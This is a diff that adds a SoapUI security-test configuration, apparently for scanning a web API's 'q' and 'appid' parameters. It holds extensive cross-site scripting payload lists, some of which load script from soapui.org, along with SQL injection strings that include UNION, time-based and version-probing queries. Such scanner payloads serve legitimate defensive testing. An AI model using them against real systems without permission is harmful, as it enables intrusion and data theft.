@@ -1,0 +1,1580 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<con:securityTest xmlns:con="http://eviware.com/soapui/config" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="619a0840-46d2-4907-965b-ca7ea31fc766" testCaseId="a93ff6c4-a4a2-45cf-bfbe-61226a74fc70" name="Security Test 1" failSecurityTestOnScanErrors="true">
+  <con:settings id="9df07e31-7b0a-4b64-91b2-25403cdc666b">
+    <con:setting id="619a0840-46d2-4907-965b-ca7ea31fc766fileName">Security-Test-1</con:setting>
+  </con:settings>
+  <con:testStepSecurityTest>
+    <con:testStepId>c261bced-4dfe-4022-97a5-192543b83916</con:testStepId>
+    <con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="7691a0c4-b41e-4b26-82b5-5ee5fa71093e" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:nil="true"/>
+      <con:assertion type="Sensitive Information Exposure" id="3e1ad699-8e7a-4a79-9eff-dd12ab8e10c5" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="Response SLA Assertion" id="4e39ad74-edb3-480a-bdd4-1b3d3b16134b" name="Response SLA">
+        <con:configuration>
+          <SLA>1000</SLA>
+        </con:configuration>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true">
+        <con:parameters label="q" parameterName="q" xpath="" checked="true"/>
+        <con:parameters label="appid" parameterName="appid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="6e44703a-5e59-486b-8fa2-d6d7dd157f97" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:CrossSiteScriptingScan">
+        <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="8f081fba-fb7a-485b-9139-4ea4bbeadfa6" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="CrosSiteScript" id="f189b3bb-e21b-4f99-b1fd-9c4d7fd8e450" name="Cross Site Scripting Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true">
+        <con:parameters label="q" parameterName="q" xpath="" checked="true"/>
+        <con:parameters label="appid" parameterName="appid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="31bb1224-d454-4cc7-b5f2-982638eb04e6" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:FuzzerScan">
+        <con:minimal>5</con:minimal>
+        <con:maximal>15</con:maximal>
+        <con:numberOfRequest>100</con:numberOfRequest>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="4083361b-af9a-4aae-97c6-2e0c299cfabf" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true">
+        <con:parameters label="q" parameterName="q" xpath="" checked="true"/>
+        <con:parameters label="appid" parameterName="appid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" immutable="true">
+        <con:strategy>ALL_AT_ONCE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="252ff2e5-d180-4df4-a9f1-5df4458dde7e" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:InvalidSecurityScan">
+        <con:typesList>
+          <con:type>3</con:type>
+          <con:value>true</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>4</con:type>
+          <con:value>GpM7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>5</con:type>
+          <con:value>0FB7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>9</con:type>
+          <con:value>-1E4f</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>10</con:type>
+          <con:value>12.45E+12</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>11</con:type>
+          <con:value>-1.23</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>12</con:type>
+          <con:value>SoapUI is	 the
+ best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>13</con:type>
+          <con:value>P1Y2M3DT10H30M12.3S</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>14</con:type>
+          <con:value>1999-05-31T13:20:00.000-05:00</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>16</con:type>
+          <con:value>1999-05-31</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>22</con:type>
+          <con:value>-1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>23</con:type>
+          <con:value>-882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>24</con:type>
+          <con:value>-2147483647</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>25</con:type>
+          <con:value>-32768</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>26</con:type>
+          <con:value>127</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>27</con:type>
+          <con:value>0</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>28</con:type>
+          <con:value>-1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>29</con:type>
+          <con:value>1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>30</con:type>
+          <con:value>1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>31</con:type>
+          <con:value>882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>32</con:type>
+          <con:value>294967295</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>33</con:type>
+          <con:value>65535</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>34</con:type>
+          <con:value>255</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>35</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>36</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="2e7e3b95-8d8f-440b-9cb9-b584c8eb0b86" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true">
+        <con:parameters label="q" parameterName="q" xpath="" checked="true"/>
+        <con:parameters label="appid" parameterName="appid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="d4d4032f-38cc-4d2b-b7d5-413b1f581243" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:SQLInjectionScan">
+        <con:sqlInjectionStrings>'-'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>and (select substring(@@version,2,1))='i'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 4--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>benchmark(50000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or ''&amp;'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 20</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>waitfor delay '00:00:05'#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin"or 1=1 or ""="</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin") or ("1"="1"/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' or '1'='1'#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1=0--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>%</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>+benchmark(3200,SHA1(1))+'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>,</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 21</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 13#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' or '1'='1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>and (select substring(@@version,3,1))='S'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 22--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 22</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 24#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>")) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>\</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>`</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>));waitfor delay '0:0:5'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 10--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 23</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or sleep(5)='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings>
